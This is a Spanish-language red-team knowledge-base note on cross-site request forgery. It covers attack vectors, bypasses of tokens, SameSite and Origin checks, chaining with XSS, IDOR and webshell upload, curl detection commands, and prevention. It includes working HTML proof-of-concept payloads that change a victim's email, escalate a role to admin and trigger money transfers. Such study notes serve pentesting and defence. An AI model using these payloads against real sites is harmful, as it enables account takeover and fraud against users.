---
aliases:
  - CSRF
  - XSRF
  - Cross Site Request Forgery
tags:
  - type/hub
  - vuln/csrf
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Explotación Web]]"
type: Hub
linked:
  - "[[Clickjacking]]"
  - "[[Authentication & Authorization Bypass]]"
  - "[[Cross-Site Scripting (XSS)]]"
  - "[[Cookies y Sesiones]]"
---
# Cross-Site Request Forgery (CSRF)

***

## Overview

Fuerza al navegador de una víctima autenticada a emitir requests state-changing hacia la app vulnerable. Explota que el browser adjunta cookies de sesión automáticamente en requests cross-origin.

> **Condiciones**: víctima con sesión activa + endpoint state-changing sin token CSRF + sin verificación de origen (`Origin` / `Referer`) + cookies sin `SameSite=Strict|Lax` o bypass del mismo.

***

## Vectores de ataque

| Vector | Target | PoC |
| --- | --- | --- |
| **GET CSRF** | Endpoints state-changing sobre GET | `<img src="https://app/transfer?to=atk&amt=1000">` |
| **POST CSRF simple** | `application/x-www-form-urlencoded` | Form auto-submit con JS |
| **JSON CSRF** | APIs esperando `application/json` | `<form enctype="text/plain">` + payload shaping |
| **Multipart CSRF** | Upload endpoints | `enctype="multipart/form-data"` |
| **Login CSRF** | Forzar login con creds atacante (phishing chain) | Form POST a `/login` con creds del atacante |

***

## PoC — POST clásico

```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://victim.tld/change_email" method="POST">
      <input name="email" value="pwn@atk.tld">
      <input name="confirm" value="pwn@atk.tld">
    </form>
  </body>
</html>
```

Hostear en dominio atacante, enviar link a víctima autenticada.

## PoC — JSON CSRF con text/plain

```html
<form action="https://api.victim.tld/update" method="POST" enctype="text/plain">
  <input name='{"role":"admin","x":"' value='"}'>
  <input type="submit">
</form>
```

Body resultante: `{"role":"admin","x":"=}` — parseable si el backend es tolerante.

## PoC — Fetch con credentials (si CORS mal configurado)

```html
<script>
fetch('https://victim.tld/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({to: 'atk', amount: 1000})
});
</script>
```

Requiere `Access-Control-Allow-Credentials: true` + origen permitido (regex débil, null origin, wildcard incorrecto).

***

## Bypass de protecciones

### CSRF tokens

- **Token en URL** → leak por `Referer` a sitio atacante.
- **Token predecible** (timestamp, secuencial, MD5 de user ID) → predecir.
- **Token no atado a sesión** → usar uno propio.
- **Validación solo en POST** → cambiar método a GET si el endpoint lo acepta.
- **Validación opcional** (pasa si el header ausente) → eliminar el header del request.
- **Token duplicado en cookie + body** (double submit) → si atacante puede setear cookie (subdomain takeover, cookie injection).

### SameSite

- **`Lax`** → permite GET top-level navigation. Explotar con `<a>`, `window.open`, redirect.
- **`Lax` + method override** → `?_method=POST` en GET.
- **Falta de atributo en Chrome < 80** → tratado como `None`.
- **Subdomain compromise** → setear cookies del root domain.

### Referer / Origin checks

- **Regex débil** (`victim.tld` en cualquier lugar) → `attacker.victim.tld.evil.com`.
- **Null Referer** → `<meta name="referrer" content="no-referrer">` o `data:` / `blob:`.
- **HTTP → HTTPS strip** si downgrade posible.

### Custom headers (CORS preflight)

- Si se usa `X-Requested-With` o similar, atacar solo con `simple request` (GET/POST sin headers custom) sobre endpoints que no requieran el header.

***

## Cadena con otras vulns

- **CSRF + XSS Self** → self-XSS solo explotable con tu sesión se convierte en stored/reflected vía CSRF login.
- **CSRF + IDOR** → cambiar recurso de otro usuario via su sesión.
- **Login CSRF + Stored XSS en perfil atacante** → víctima queda logueada como atacante, triggerea XSS.
- **CSRF + File Upload** → subir webshell con sesión de admin.

***

## Detección

```bash
# Buscar forms sin token
curl -s https://victim/form | grep -iE '<form|csrf|token|_token'

# Verificar SameSite
curl -sI https://victim/login | grep -i 'set-cookie'

# Checar Origin validation
curl -X POST https://victim/api -H 'Origin: https://evil.tld' -H 'Cookie: session=...' -d 'x=1'
```

Burp → Engagement tools → Generate CSRF PoC (click derecho sobre request).

***

## Prevención

- **CSRF tokens** sync: por sesión o por request, atados al user, validados en server side.
- **SameSite=Lax** default (moderno), `Strict` para acciones sensibles.
- **Double submit cookie** si no hay estado server side.
- **Origin / Referer** validación explícita.
- **Re-auth** para acciones críticas (password change, email change, transfers).
- **Custom request headers** (`X-Requested-With: XMLHttpRequest`) para APIs — fuerza preflight CORS.

***

## Recursos

- [PortSwigger - CSRF](https://portswigger.net/web-security/csrf)
- [OWASP - CSRF Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [HackTricks - CSRF](https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery)

***
